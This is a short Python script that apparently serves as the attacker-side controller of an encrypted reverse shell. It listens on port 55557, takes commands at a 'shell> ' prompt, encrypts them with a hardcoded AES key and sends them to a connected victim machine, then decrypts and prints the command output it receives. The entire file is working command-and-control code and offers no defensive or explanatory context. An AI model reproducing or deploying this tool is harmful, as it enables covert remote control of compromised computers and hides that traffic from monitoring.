#!/usr/bin/python

import os,sys,socket
import base64
from Crypto.Cipher import AES

BUFFER = 4096
BLOCK = 32
PADDING = '!'
SECRET = "Fj39@vF4@54&8dE@!)(*^+-pL;'dK3J2"
HOST = '0.0.0.0'
PORT = 55557

pad = lambda s: s + (BLOCK - len(s) % BLOCK) * PADDING
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

cipher = AES.new(SECRET)

server = socket.socket()
server.bind((HOST, PORT))

server.listen(5)
client, addr = server.accept()
print 'Got connection from ', addr


while True:
	cmd = raw_input("shell> ")

	cmd = EncodeAES(cipher, cmd)
	cmd = base64.b64encode(cmd)

	client.send(cmd)

	result = client.recv(BUFFER)

	result = base64.b64decode(result)
	result = DecodeAES(cipher, result) 

	print(result)

client.close()



